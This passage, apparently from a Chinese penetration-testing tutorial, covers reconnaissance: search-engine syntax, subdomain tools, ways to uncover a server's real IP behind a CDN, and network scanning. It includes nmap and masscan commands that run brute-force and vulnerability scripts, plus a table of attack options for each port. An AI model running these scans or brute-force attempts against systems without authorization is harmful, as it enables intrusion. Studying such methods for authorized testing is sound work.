| [title="beijing"](https://fofa.so/result?qbase64=dGl0bGU9ImJlaWppbmci) | 从标题中搜索“北京”                                 | -                                                     |
| [header="jboss"](https://fofa.so/result?qbase64=aGVhZGVyPSJqYm9zcyI%3D) | 从http头中搜索“jboss”                              | -                                                     |
| [body="Hacked by"](https://fofa.so/result?qbase64=Ym9keT0iSGFja2VkIGJ5Ig%3D%3D) | 从html正文中搜索abc                                | -                                                     |
| [domain="qq.com"](https://fofa.so/result?qbase64=ZG9tYWluPSJxcS5jb20i) | 搜索根域名带有qq.com的网站。                       | -                                                     |
| [icon_hash="-247388890"](https://fofa.so/result?qbase64=aWNvbl9oYXNoPSItMjQ3Mzg4ODkwIg%3D%3D) | 搜索使用此icon的资产。                             | 仅限高级会员使用                                      |
| [host=".gov.cn"](https://fofa.so/result?qbase64=aG9zdD0iLmdvdi5jbiI%3D) | 从url中搜索”.gov.cn”                               | 搜索要用host作为名称                                  |
| [port="443"](https://fofa.so/result?qbase64=cG9ydD0iNDQzIg%3D%3D) | 查找对应“443”端口的资产                            | -                                                     |
| [ip="1.1.1.1"](https://fofa.so/result?qbase64=aXA9IjEuMS4xLjEi) | 从ip中搜索包含“1.1.1.1”的网站                      | 搜索要用ip作为名称                                    |
| [ip="220.181.111.1/24"](https://fofa.so/result?qbase64=aXA9IjIyMC4xODEuMTExLjEvMjQi) | 查询IP为“220.181.111.1”的C网段资产                 | -                                                     |
| [status_code="402"](https://fofa.so/result?qbase64=c3RhdHVzX2NvZGU9NDAy) | 查询服务器状态为“402”的资产                        | -                                                     |
| [protocol="https"](https://fofa.so/result?qbase64=cHJvdG9jb2w9Imh0dHBzIg%3D%3D) | 查询https协议资产                                  | 搜索指定协议类型(在开启端口扫描的情况下有效)          |
| [city="Hangzhou"](https://fofa.so/result?qbase64=Y2l0eT0iSGFuZ3pob3Ui) | 搜索指定城市的资产。                               | -                                                     |
| [region="Zhejiang"](https://fofa.so/result?qbase64=cmVnaW9uPSJaaGVqaWFuZyI%3D) | 搜索指定行政区的资产。                             | -                                                     |
| [country="CN"](https://fofa.so/result?qbase64=Y291bnRyeT0iQ04i) | 搜索指定国家(编码)的资产。                         | -                                                     |
| [cert="google"](https://fofa.so/result?qbase64=Y2VydD0iZ29vZ2xlIg%3D%3D) | 搜索证书(https或者imaps等)中带有google的资产。     | -                                                     |
| [banner=users && protocol=ftp](https://fofa.so/result?qbase64=YmFubmVyPXVzZXJzICYmIHByb3RvY29sPWZ0cA%3D%3D) | 搜索FTP协议中带有users文本的资产。                 | -                                                     |
| [type=service](https://fofa.so/result?qbase64=dHlwZT1zZXJ2aWNl) | 搜索所有协议资产，支持subdomain和service两种。     | 搜索所有协议资产                                      |
| [os=windows](https://fofa.so/result?qbase64=b3M9d2luZG93cw%3D%3D) | 搜索Windows资产。                                  | -                                                     |
| [server=="Microsoft-IIS/7.5"](https://fofa.so/result?qbase64=c2VydmVyPT0iTWljcm9zb2Z0LUlJUy83LjUi) | 搜索IIS 7.5服务器。                                | -                                                     |
| [app="HIKVISION-视频监控"](https://fofa.so/result?qbase64=YXBwPSJISUtWSVNJT04t6KeG6aKR55uR5o6nIg%3D%3D) | 搜索海康威视设备                                   | -                                                     |
| [after="2017" && before="2017-10-01"](https://fofa.so/result?qbase64=YWZ0ZXI9IjIwMTciICZhbXA7JmFtcDsgYmVmb3JlPSIyMDE3LTEwLTAxIg%3D%3D) | 时间范围段搜索                                     | -                                                     |
| [asn="19551"](https://fofa.so/result?qbase64=YXNuPSIxOTU1MSI%3D) | 搜索指定asn的资产。                                | -                                                     |
| [org="Amazon.com, Inc."](https://fofa.so/result?qbase64=b3JnPSJBbWF6b24uY29tLCBJbmMuIg%3D%3D) | 搜索指定org(组织)的资产。                          | -                                                     |
| [base_protocol="udp"](https://fofa.so/result?qbase64=YmFzZV9wcm90b2NvbD0idWRwIg%3D%3D) | 搜索指定udp协议的资产。                            | -                                                     |
| [is_ipv6=true](https://fofa.so/result?qbase64=aXNfaXB2Nj10cnVl) | 搜索ipv6的资产                                     | 搜索ipv6的资产,只接受true和false。                    |
| [is_domain=true](https://fofa.so/result?qbase64=aXNfZG9tYWluPXRydWU%3D) | 搜索域名的资产                                     | 搜索域名的资产,只接受true和false。                    |
| [ip_ports="80,161"](https://fofa.so/result?qbase64=aXBfcG9ydHM9IjgwLDE2MSI%3D) | 搜索同时开放80和161端口的ip                        | 搜索同时开放80和161端口的ip资产(以ip为单位的资产数据) |
| [port_size="6"](https://fofa.so/result?qbase64=cG9ydF9zaXplPSI2Ig%3D%3D) | 查询开放端口数量等于"6"的资产                      | 仅限FOFA会员使用                                      |
| [port_size_gt="3"](https://fofa.so/result?qbase64=cG9ydF9zaXplX2d0PSIzIg%3D%3D) | 查询开放端口数量大于"3"的资产                      | 仅限FOFA会员使用                                      |
| [port_size_lt="12"](https://fofa.so/result?qbase64=cG9ydF9zaXplX2x0PSIxMiI%3D) | 查询开放端口数量小于"12"的资产                     | 仅限FOFA会员使用                                      |
| [ip_country="CN"](https://fofa.so/result?qbase64=aXBfY291bnRyeT0iQ04i) | 搜索中国的ip资产(以ip为单位的资产数据)。           | 搜索中国的ip资产                                      |
| [ip_region="Zhejiang"](https://fofa.so/result?qbase64=aXBfcmVnaW9uPSJaaGVqaWFuZyI%3D) | 搜索指定行政区的ip资产(以ip为单位的资产数据)。     | 搜索指定行政区的资产                                  |
| [ip_city="Hangzhou"](https://fofa.so/result?qbase64=aXBfY2l0eT0iSGFuZ3pob3Ui) | 搜索指定城市的ip资产(以ip为单位的资产数据)。       | 搜索指定城市的资产                                    |
| [ip_after="2019-01-01"](https://fofa.so/result?qbase64=aXBfYWZ0ZXI9IjIwMTktMDEtMDEi) | 搜索2019-01-01以后的ip资产(以ip为单位的资产数据)。 | 搜索2019-01-01以后的ip资产                            |
| [ip_before="2019-07-01"](https://fofa.so/result?qbase64=aXBfYmVmb3JlPSIyMDE5LTA3LTAxIg%3D%3D) | 搜索2019-07-01以前的ip资产(以ip为单位的资产数据)。 | 搜索2019-07-01以前的ip资产                            |

基础了解后，可以试试规则专题，官方有提供相应的指纹、组件查找，包含“数据库专题”、“工控专题”和“区块链专题”。也可以自己提交。

- https://fofa.info/library

<img src="image/image-20240719112020031.png" alt="image-20240719112020031" style="zoom:80%;" />

- 查询”致远互联-OA“系统：

<img src="image/image-20240719112024465.png" alt="image-20240719112024465" style="zoom:80%;" />

[Shodan](https://www.shodan.io/)

Shodan是一个搜索接入互联网的设备的搜索引擎，2009年由约翰·马瑟利发布。学生会员可以每个月下载1w条数据，黑五可能会有优惠价格。

> ps：Shodan 侧重于主机设备

- [规则列表](https://www.shodan.io/explore)

<img src="image/image-20240719112051561.png" alt="image-20240719112051561" style="zoom: 67%;" />

[**0.zone**](https://0.zone/)

它是一个免费的外部攻击面管理SaaS平台，供红蓝队使用，为防御者提供攻击者视角下的企业外部攻击面数据，减少攻防信息差，以促进企业攻击面的收敛和管理。

- [语法参考](https://0.zone/grammarList)

<img src="image/image-20240719112124559.png" alt="image-20240719112124559" style="zoom:67%;" />

**搜索企业名称示例**（需要会员才能获取企业黄页）

可查看此公司下匹配到的信息系统、移动端应用、敏感目录、邮箱、文档、代码、人员信息数据。这个功能定向查找单位资产非常方便好用。

<img src="image/image-20240719112142515.png" alt="image-20240719112142515" style="zoom:80%;" />

不同于fofa，该平台做了收录信息归纳，感觉还不错。

- 使用参考：https://mp.weixin.qq.com/s/0Nf_HJr-Rn4mZEC3QYKtwg

[hunter](https://hunter.qianxin.com/)

全球鹰是奇安信的一款产品。通过网络空间测绘技术，全球鹰测绘平台可以提供IP、域名、开放端口、应用/组件、所属企业等关键安全信息，同时结合攻防场景绘制了资产画像与IP画像，实现互联网资产的可查、可定位、操作可识别的检索，助力企业日常的安全运营工作，例如未知资产发现、风险识别、漏洞修复等。目前全球鹰网络空间测绘平台已有3亿独立IP，资产(剔除历史重复数据)总数超过20亿，已实现全端口覆盖。在全球我们已覆盖了261个国家，96% ASN域。国内web资产最快4天更新，最慢7天更新。

[语法参考](https://hunter.qianxin.com/)

<img src="image/image-20240719112203639.png" alt="image-20240719112203639" style="zoom:80%;" />

其他

还有一些不错的检索平台，就不一一介绍，可以去官网瞧瞧语法和规则这块，这块还是api用得多。*（没会员没法爽玩。。）*

- [zoomeye](https://www.zoomeye.org/)
- [quake](https://quake.360.cn/)
- [谛听](https://www.ditecting.com/)
- [知风](https://zhifeng.io/web/new/)
- [binaryedge](https://www.binaryedge.io/)
- [censys](https://search.censys.io/)
- [dnsdb](https://dnsdb.io/zh-cn/)
- [greynoise](https://www.greynoise.io/blog)
- [hunter](https://hunter.io/)
- [Project Sonar](https://opendata.rapid7.com/)
- [intelx](https://intelx.io/)
- [dnsdumpster](https://dnsdumpster.com/)
- phonebook.cz
- [fullhunt](https://fullhunt.io/)
- [netlas](https://netlas.io/)

关于搜索引擎详细可以参考下：

- [网络空间检索平台对比](https://www.cnblogs.com/Akkuman/p/15469098.html)
- [零零信安攻击面管理系统 | 企业信息泄露情报平台](https://www.iculture.cc/cybersecurity/pig=16553)
- [盘点一下在渗透测试中可能用到的网络搜索引擎](https://www.77169.net/html/289075.html)

##### 07工具自动化

总的来说，信息收集有很多重复性查询筛选，手工相对费时费力，因此可以借助半自动化工具来达到事半功倍的效果。

**OneForAll**

> https://github.com/shmilylty/OneForAll

解决大多传统子域名收集工具不够强大、不够友好、缺少维护和效率问题的痛点，是一款集百家之长，功能强大的全面快速子域收集终极神器。

**subfinder**

> https://github.com/projectdiscovery/subfinder

brew install subfinder

Subfinder 是一个子域发现工具，它通过使用被动在线资源来发现网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。 subfinder 是为只做一件事而构建的——被动子域枚举，它做得很好。

**ksubdomain**

> https://github.com/knownsec/ksubdomain

ksubdomain是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。

**JSINFO-SCAN**

> https://github.com/p1g3/JSINFO-SCAN

递归爬取域名(netloc/domain)，以及递归从JS中获取信息的工具

**URLFinder**

> https://github.com/pingc0y/URLFinder

URLFinder是一款用于快速提取检测页面中JS与URL的工具。

功能类似于JSFinder，但JSFinder好久没更新了。

Layer**子域名挖掘机**

> https://github.com/euphrat1ca/LayerDomainFinder

Layer子域名挖掘机是一款子域名收集工具，拥有简洁的界面和简单的操作模式，支持服务接口查询和暴力枚举获取子域名信息，同时可以通过已获取的域名进行递归爆破。

**ESD**

> https://github.com/FeeiCN/ESD

支持泛解析功能较全的枚举子域工具

**EyeWitness**

> https://github.com/FortyNorthSecurity/EyeWitness

Eyewitness可自动查询URL对应网站的截图、RDP服务、Open VNC服务器以及一些服务器title、甚至是可识别的默认凭据等，最终会生成一个详细的html报告。

## IP信息搜集

通过ip或域名获取到一些基本信息（端口、服务、架构、目录等）后，也可以通过ip段目标扩大攻击面，也有可能找到一些未分配的边缘资产。

### 01绕过cdn获取真实ip

CDN是IP信息探测或打点必不可绕过的一个话题。当目标使用了CDN加速，获取到的目标ip不一定是真实ip。所以通常在实施端口、漏扫等测试之前，需判断下是否真实IP，是否使用了CDN或其他代理等等，避免无效操作、蜜罐、非目标点。

```
CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。
```

#### 常见CDN服务商

**一、国内 CDN 服务商**

- 阿里云 CDN
- 百度云 CDN
- 七牛云 CDN
- 又拍云 CDN
- 腾讯云 CDN
- Ucloud
- 360 CDN
- 网宿科技
- ChinaCache
- 帝联科技

**二、国外 CDN 服务商**

- CloudFlare
- StackPath
- Fastly
- Akamai
- CloudFront
- Edgecast
- CDNetworks
- Google Cloud CDN
- CacheFly
- Keycdn
- Udomain
- CDN77

#### CDN判断

确定CDN加速解析后，那就要考虑如何绕过来获取真实ip，以进一步攻击利用。

##### 0x01 多ping

通过多地ping目标域名，如果没有使用CDN，只会显示一个IP地址，或者双线接入情况的两个不同运营商ip。

多ping在线站点：

- http://ping.chinaz.com/
- https://ping.aizhan.com/
- http://www.webkaka.com/Ping.aspx
- https://www.host-tracker.com/v3/check/

如图，不同地区访问有不同ip，一般存在CDN：

<img src="image/image-20240719112940726.png" alt="image-20240719112940726" style="zoom:80%;" />

##### 0x02 nslookup

获取到的DNS域名解析结果中返回多个ip的，一般都是存在CDN服务。

<img src="image/image-20240719113016856.png" alt="image-20240719113016856" style="zoom:80%;" />

##### 0x03 header头信息

- 请求响应包header头中是否存在cdn服务商信息
- 报错信息
- 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN

<img src="image/image-20240719144056876.png" alt="image-20240719144056876" style="zoom:80%;" />

##### 0x04 在线检测工具

- https://www.cdnplanet.com/tools/cdnfinder/
- https://tools.ipip.net/cdn.php
- https://whatsmycdn.com/

<img src="image/image-20240719144215246.png" alt="image-20240719144215246" style="zoom:67%;" />

#### 获取真实IP

##### 0x01 dns历史绑定记录

查询域名历史解析记录，可**能会存在未使用cdn之前的真实ip**记录：

- https://dnsdb.io/zh-cn/
- https://securitytrails.com/
- https://x.threatbook.cn/
- http://toolbar.netcraft.com/site_report?url=
- https://viewdns.info/iphistory/?domain=
- https://site.ip138.com/www.xxx.com/

CDN判断：

<img src="image/image-20240719144630503.png" alt="image-20240719144630503" style="zoom:80%;" />

存在CDN，利用微步查询获取历史记录，然后将每个ip都测试一篇

<img src="image/image-20240719144941574.png" alt="image-20240719144941574" style="zoom:80%;" />

通过源代码获取，确定真实ip

<img src="image/image-20240719145241933.png" alt="image-20240719145241933" style="zoom:80%;" />

##### 0x02 **网络空间测绘搜索引擎**

> 网络空间测绘，一般都会定时把全网资产扫一遍存在数据库里。

通过网络空间测绘搜索引擎搜索其收录的目标相关信息，有概率获取到目标真实IP。

- [fofa](https://fofa.so/)
- [shodan](https://www.shodan.io/)
- [quake](https://quake.360.cn/quake/#/index)
- [Censys.io](https://censys.io/)

大概从以下几个关键因素去搜索验证：

- ip
- 域名
- title
- logo
- icp
- body
- js/css/html等静态特征值

<img src="image/image-20240719145452707.png" alt="image-20240719145452707" style="zoom:80%;" />

通过获取logo icon指纹哈希特征，搜索其相同的主机结果，进一步探测真实IP：

<img src="image/image-20240719150833038.png" alt="image-20240719150833038" style="zoom:80%;" />

<img src="image/image-20240719151130581.png" alt="image-20240719151130581" style="zoom:80%;" />

##### 0x03 子域名

考虑到CDN成本问题，一些重要站点会采用cdn加速，而一些子域名则没有使用。一般情况下，一些子域名与主站的真实ip在同一c段或同一台服务器上，这时就可以通过发现子域名c段ip、端口信息，逐个探测定位主站真实ip地址。

常见查找方法和工具：

- [各大搜索引擎](http://sousuo.org.cn/)
- [微步在线](https://x.threatbook.cn/)
- [oneforall](https://github.com/shmilylty/OneForAll)
- [ksubdomain](https://github.com/knownsec/ksubdomain)
- [Jsinfo-scan](https://github.com/p1g3/JSINFO-SCAN)

##### 0x04 异地ping

部分国内cdn广商只做了国内的线路，而没有铺设对国外的线路，这时就可以通过海外解析直接获取到真实IP。

可以使用：

部分国内cdn广商只做了国内的线路，而没有铺设对国外的线路，这时就可以通过海外解析直接获取到真实IP。

可以使用：

- http://ping.chinaz.com/
- https://asm.ca.com/zh_cn/ping.php
- http://host-tracker.com/
- http://www.webpagetest.org/
- https://dnscheck.pingdom.com/
- https://www.host-tracker.com/v3/check/

<img src="image/image-20240719151251875.png" alt="image-20240719151251875" style="zoom:80%;" />

##### 0x05 SSL证书

证书颁发机构 (CA) 必须将他们发布的每个 SSL/TLS 证书发布到公共日志中，SSL/TLS 证书通常包含域名、子域名和电子邮件地址。因此可以利用 SSL/TLS 证书来发现目标站点的真实 IP 地址。

CDN在提供保护的同时，也会与服务器之间进行加密通信（SSL）。当通过服443端口去访问服务器ip或域名时，就会暴露其SSL证书，也就可以通过证书比对发现服务器的真实IP地址。

**在线：**

- https://crt.sh/

通过 [https://crt.sh](https://crt.sh/) 进行快速证书查询收集

<img src="image/image-20240719151430695.png" alt="image-20240719151430695" style="zoom:80%;" />

- [Censys 引擎](https://censys.io/)

  Censys 搜索引擎能够扫描整个互联网，每天都会扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，可以利用 Censys 进行全网方面的 SSL 证书搜索，找到匹配的真实 IP 。

通过Censys引擎搜索证书信息，发现多个有效或无效的证书：

https://search.censys.io/certificates?q=www.roken-niji.jp

> ps: 并不是有效的证书才是有价值的，无效的证书中也会有很多服务器配置错误依然保留着的信息。

<img src="image/image-20240719151800865.png" alt="image-20240719151800865" style="zoom:80%;" />

精准定位有效SSL证书：

```bash
parsed.names: xxx.com and tags.raw: trusted
```

<img src="image/image-20240719151828273.png" alt="image-20240719151828273" style="zoom:80%;" />

逐个打开，根据sha1签名反查主机

<img src="image/image-20240719151854493.png" alt="image-20240719151854493" style="zoom:80%;" />

无果

<img src="image/image-20240719151914219.png" alt="image-20240719151914219" style="zoom:80%;" />

**命令行**

- openssl

```bash
openssl s\_client -connect roken-niji.jp:443 | grep subject
```

<img src="image/image-20240719151943364.png" alt="image-20240719151943364" style="zoom:67%;" />

- curl

```bash
curl -v https://www.roken-niji.jp/ | grep 'subject'
```

工具：

```
CloudFlair
```

项目地址：https://github.com/christophetd/CloudFlair

> 使用来自 Censys 的全网扫描数据查找 CloudFlare 背后网站的源服务器。

##### 0x06 敏感文件泄露

包括但不限于：

- 服务器日志文件
- 探针文件，例如 phpinfo
- 网站备份压缩文件
- .DS_Store
- .hg
- .git
- SVN
- Web.xml

![image-20240719152459651](image/image-20240719152459651.png)

##### 0x07 CDN配置问题

某些站点只做了www cname到CDN上，导致[www.xxx.com](https://forum.butian.net/share/www.xxx.com)和xxx.com是两条独立的解析记录，所以可以通过直接ping域名xxx.com获取到未加入cdn的真实IP，同理http协议和https协议配置也是有可能出现这种问题。

##### 0x08 漏洞

- 网站本身存在一些漏洞时，如XSS/SSRF/XXE/命令执行等，通过带外服务器地址注入，使服务器主动连接，被动获取连接记录。
- 部分本身功能，如url采集、远程url图片、编辑器问题等。
- 异常信息、调式信息等都有可能泄露真实IP或内网ip的。
  - ThinkPHP 报错/SpringBoot变量/phpinfo

<img src="image/image-20240719152550569.png" alt="image-20240719152550569" style="zoom:80%;" />

##### 0x09 邮件头信息

一般邮件系统都在内部，没有经过CDN解析，通过邮件发送、RSS订阅等sendmail功能去获取到服务器与邮箱系统交互的邮件源码，在源文件头信息或者源代码中就会包含服务器真实ip。但需注意该ip是否第三方邮件服务器（如腾讯企业邮件、阿里企业邮箱），一般只有应用与网站在同一服务器上时，才获取到当前服务器的真实ip。

常见交互功能点：

- RSS 订阅
- 邮箱注册、激活处
- 邮箱找回密码处
- 产品更新的邮件推送
- 某业务执行后发送的邮件通知
- 员工邮箱、邮件管理平台等入口处的忘记密码

可以通过查mx记录确定下是否第三方邮件服务器，当然这里这个邮箱很明显了。。

![image-20240719152741539](image/image-20240719152741539.png)

- 大佬分享的`奇淫技巧`：通过发送邮件给一个不存在的邮箱地址，比如 [000xxx@domain.com](mailto:000xxx@domain.com) ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。
- foxmail导出的邮件可以用编辑器打开查看其内容。

##### 0x10 vhost碰撞

只要字典够强大，数据够多，通过 IP 和子域的碰撞，总会有所收获。

在线工具：

https://pentest-tools.com/information-gathering/find-virtual-hosts#

##### 0x11 应用程序

一些app、小程序会直接采用ip进行通信交互，也可以通过一些历史版本探测真实ip。

##### 0x12 **通过 F5 LTM 解码**

> 一般常用的负载均衡实现方式：
>
> - 基于cookie的会话保持
> - 基于session的会话保持，如weblogic的session复制机制
> - 基于四层的负载，ip+端口。

- LTM 是将所有的应用请求分配到多个节点服务器上。提高业务的处理能力，也就是负载均衡。F5 LTM也就是5公司旗下的一种负载均衡方案。
- 当服务器使用 F5 LTM 做负载均衡时，通过对 `set-cookie` 关键字的解码，可以获取服务器真实 ip 地址。

**例如：基于cookie会话保持情况：**

F5在获取到客户端第一次请求时，会使用set cookie头，给客户端标记一个特定的cookie。

```http
Set-Cookie: BIGipServerPool-i-am-na\_tcp443=2388933130.64288.0000; path=/;
```

后续客户端请求时，F5都会去校验cookie中得字段，判断交给那个服务器处理。那么就可以利用此机制，获取处理服务器的ip地址，大概率也是网站服务器真实ip。具体解法如下：

- 先把第一小节的十进制数，即 2388933130 取出来
- 将其转为十六进制数 8e643a0a
- 接着从后至前，取四个字节出来：0a.3a.64.8e
- 最后依次转为十进制数 10.58.100.142，即是服务器的真实ip地址。

一般来说基本都是内网ip，但也有例外，得看部署情况，无意间找到一个：

```http
Set-Cookie: BIGipServerpool-shibboleth3-dev-8080=3045805720.36895.0000; path=/; Httponly
```

自动化解码工具：

https://github.com/ezelf/f5_cookieLeaks

```http
Set-Cookie: BIGipServerpool-shibboleth3-dev-8080=3045805720.36895.0000; path=/; Httponly
```

##### 0x13 其他

- 扫全网
  - https://github.com/superfish9/hackcdn
  - https://github.com/boy-hack/w8fuckcdn
- 流量攻击
  - 对不设防的CDN发起大量访问，导致出错或服务器更换时可能会泄露真实ip。
- 长期关注
  - 定期访问记录ip变化，业务变更或架构调整可能会有更换服务器更换ip的情况。
- 流量包问题
  - 部分开发者会将真实ip记录到一些header响应头或者响应包中。
- 403绕过
  - 当目标地址放在标头（如Location头）中时，可通过抓包将http协议改为1.0并将请求中除第一行外的所有数据删掉，再发送请求有机会再相应包中Location头获取到真实ip地址。
  - ……

更多方法可以参考binmaker大佬的总结：

[渗透测试中最全的CDN绕过总结](https://mp.weixin.qq.com/s?__biz=MzIzNzMxMDkxNw==&mid=2247490046&idx=1&sn=994fc288c54907e7317c6818e2e2507b&chksm=e8cbdf54dfbc5642dd5ac26de38bfcf5749614d5bf6ba5bb61cb9078a59027d6ee7f5e183ad1#rd)

### 02组织IP段

当目标信息比较笼统时，可以通过IP地址注册信息查询运营商给目标组织所分配的ip段信息，继而对这个段进行测试。这样既可以扩大范围也有可能直接找到CDN后的真实服务器。

- [CNNIC IP地址注册信息查询系统](https://ipwhois.cnnic.net.cn/)

<img src="image/image-20240719154809803.png" alt="image-20240719154809803" style="zoom:80%;" />

- [RIPE 数据库](https://apps.db.ripe.net/)

以阿里为例，收集组织对应ip信息

<img src="image/image-20240719154902117.png" alt="image-20240719154902117" style="zoom:80%;" />

- [Hurricane Electric BGP Toolkit](https://bgp.he.net/)

<img src="image/image-20240719154925604.png" alt="image-20240719154925604" style="zoom:80%;" />

### 03C段

一般都是扫C段为主，B段为辅。通过获取同在一个ip段的同类型网站或业务来扩大攻击面，往往同ip段中会存在一些后台、api相关处理服务等。

#### C段主要收集点：

- ip
- 端口
- 容器类型
- title

#### 扫描常用工具：

##### 网络空间搜索引擎（fofa、quake...)

> ps: 手工扫描都是实时的，相比空间搜索引擎较精准些。

##### nmap

- 工具强大，速度有待优化。
- 六种扫描结果
  - open(开放的)
  - filtered(被过滤的)
  - open|filtered(开放或者被过滤的)
  - closed(关闭的)
  - closed|filtered(关闭或者被过滤的)
  - unfiltered(未被过滤的)
- 常用命令

```bash
nmap -vvv -Pn -p- ip/24 -n -T4  
#-v 输出详细信息，-v/-vv/-vvv v越多信息越详细 上线3个v  
#-Pn 扫描时不用ping  
#-p-  扫描所有端口（65535个）。如果不使用 -p- ，nmap 将仅扫描1000个端口，GUI参数不可用  
#-n 不做DNS解析  
#-T4 设置时间模板,0-5部分做了扫描时间优化，默认3未作优化。4加速扫描又保持一定准确性
```

- 扫描全端口，并调用各种脚本

```bash
#!/usr/bin/env bash   

read -p "ip: " ip  
nmap -v -Pn -p- --open -sV $ip -n -T4 --max-scan-delay 10 --max-retries 3 --min-hostgroup 10 -oX $ip-result-\`date +%y-%m-%d-%H-%M-%S\`.xml --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute
```

- 快速扫描常见端口，并调用各种脚本

```bash
#!/usr/bin/env bash   

read -p "ip: " ip  
nmap -vvv -Pn -p 20,22,23,25,53,69,80-89,443,8440-8450,8080-8089,110,111,137,143,161,389,512,873,1194,1352,1433,1521,1500,1723,2082,2181,2601,3128,3312,3306,3389,3690,4848,5000,5432,5900,5984,6379,7001,7002,7003,7778,8000,8069,8888,9000,9002,9080-9081,9090,9200,10001,10002,11211,27017,50070 --open -sV $ip -n -T4 --max-scan-delay 10 --max-retries 3 --min-hostgroup 10 -oX $ip-result-\`date +%y-%m-%d-%H-%M-%S\`.xml --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute
```

##### msscan

> https://github.com/robertdavidgraham/masscan

- 速度快，精确度有待优化 ```shell

  masscan -p80,8000-8100 10.0.0.0/8 --rate=10000

  ```
  ##### masscan\_to\_nmap
  ```

https://github.com/7dog7/masscan_to_nmap

- nmap+msscan缝合怪

##### Goby

> https://cn.gobies.org/

- 资产扫描利器，支持图像化、方便快捷、可自定义poc漏扫。

##### shuize

> https://github.com/0x727/ShuiZe_0x727

- 信息收集一键化+漏洞检验

##### fscan

> https://github.com/shadow1ng/fscan

##### ALLin

> https://github.com/P1-Team/AlliN

### 04旁站(ip反查域名)

一个服务器上存在多个站点，可通过ip查询相应站点，再从相应站点进一步突破获取服务器权限。

##### 常见查询方法：

**在线平台：**

https://www.webscan.cc/
https://viewdns.info/reverseip/
https://reverseip.domaintools.com/
https://tools.ipip.net/ipdomain.php
https://dnslytics.com/

**网络空间搜索引擎：**

- fofa、zoomeye、hunte、quake等

**工具：**

- [ip2domain - 批量查询ip对应域名、备案信息、百度权重](https://github.com/Sma11New/ip2domain)
- 水泽
- nmap
- ....

### 05端口

确定真实ip后，就可以进行端口扫描，比较常见的就是nmap和masscan了，masscan相比nmap多了速度的优势，可以快速扫描全端口。扫描可以结合空间引擎结果发现更多目标端口。

> tips:
>
> - 大批量扫描时建议云上挂代理池进行。
> - 查看端口出现频率
>
> https://github.com/laconicwolf/Masscan-to-CSV
>
> - masscan扫描出的端口可以用nmap去确认

工具可参考C段章节

##### 端口渗透思路表

引用下某大佬的端口渗透思路表，可以学习学习下。

| 端口                              | 服务                  | 渗透用途                                                     |
| :-------------------------------- | :-------------------- | :----------------------------------------------------------- |
| tcp 20,21                         | FTP                   | 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4) |
| tcp 22                            | SSH                   | 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等 |
| tcp 23                            | Telnet                | 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令               |
| tcp 25                            | SMTP                  | 邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑 |
| tcp/udp 53                        | DNS                   | 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控  |
| tcp/udp 69                        | TFTP                  | 尝试下载目标及其的各类重要配置文件                           |
| tcp 80-89,443,8440-8450,8080-8089 | 各种常用的Web服务端口 | 可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等…… |
| tcp 110                           | POP3                  | 可尝试爆破,嗅探                                              |
| tcp 111,2049                      | NFS                   | 权限配置不当                                                 |
| tcp 137,139,445                   | Samba                 | 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等…… |
| tcp 143                           | IMAP                  | 可尝试爆破                                                   |
| udp 161                           | SNMP                  | 爆破默认团队字符串,搜集目标内网信息                          |
| tcp 389                           | LDAP                  | ldap注入,允许匿名访问,弱口令                                 |
| tcp 512,513,514                   | Linux rexec           | 可爆破,rlogin登陆                                            |
| tcp 873                           | Rsync                 | 匿名访问,文件上传                                            |
| tcp 1194                          | OpenVPN               | 想办法钓VPN账号,进内网                                       |
